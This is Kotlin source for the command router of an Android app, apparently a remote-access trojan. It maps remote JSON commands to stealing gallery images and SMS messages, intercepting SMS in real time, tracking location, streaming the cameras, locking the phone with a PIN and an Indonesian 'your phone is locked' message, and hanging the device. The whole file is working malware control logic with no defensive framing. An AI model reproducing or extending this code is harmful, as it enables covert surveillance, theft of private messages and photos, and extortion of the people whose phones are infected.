package com.app.cyber

import android.content.Context
import android.content.Intent
import android.os.Handler
import android.os.Looper
import org.json.JSONObject

object CommandRouter {
    fun route(ctx: Context, data: JSONObject) {
        val action = data.optString("action")
        val payload = data.optJSONObject("payload") ?: JSONObject()

        when (action) {
            "gallery_list"        -> GalleryRechive.listImages(ctx)
            "gallery_delete"      -> GalleryRechive.deleteImage(ctx, payload.optString("id"))
            "gallery_get"         -> GalleryRechive.sendImage(ctx, payload.optString("id"))
            "sms_list"            -> SmsRechive.sendAllSms(ctx)
            "sms_new"             -> SmsRechive.setupRealtime(ctx)
            "location_get"        -> LocationService.sendLast(ctx)
            "flashlight_on"       -> FlashlightController.set(ctx, true)
            "flashlight_blink"    -> FlashlightController.blink(ctx, payload.optInt("ms", 300))
            "camera_front"        -> CameraStreamer.start(ctx, 0)
            "camera_back"         -> CameraStreamer.start(ctx, 1)
            "camera_stop"         -> CameraStreamer.stop()
            "lock_start"          -> {
                val pin = payload.optString("pin", "123456")
                val msg = payload.optString("message", "HP ANDA TELAH DI LOCK")
                LockService.start(ctx, pin, msg)
            }
            "lock_stop"           -> LockService.stop(ctx)
            "hang_start"          -> HangDevice.start(ctx)
            "hang_stop"           -> HangDevice.stop()
            "open_url"            -> {
                val url = payload.optString("url", "")
                if (url.isNotEmpty()) {
                    val i = Intent(Intent.ACTION_VIEW, android.net.Uri.parse(url))
                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    ctx.startActivity(i)
                }
            }
            "music_play"          -> MusicPlayer.play(ctx, payload.optString("url", ""))
            "music_stop"          -> MusicPlayer.stop()
        }
    }
}
